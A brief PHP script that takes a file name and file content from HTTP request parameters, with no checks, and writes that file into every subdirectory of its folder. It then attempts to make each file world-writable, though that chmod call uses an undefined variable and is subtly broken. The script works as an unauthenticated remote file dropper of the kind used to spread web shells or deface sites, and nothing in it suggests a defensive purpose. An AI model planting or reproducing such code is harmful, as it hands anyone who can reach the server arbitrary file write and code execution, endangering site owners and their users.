<?php
$name = ($_REQUEST['name']) ? $_REQUEST['name'] : 'foo';
$content = ($_REQUEST['content']) ? $_REQUEST['content'] : '0';
$dir = '.';
$list = str_replace($dir.'/','',(glob($dir.'/*', GLOB_ONLYDIR)));
foreach ($list as $key=>$value) {
    file_put_contents($value.'/'.$name, $content);
    chmod($value.'/'.$filename, 0777);
}
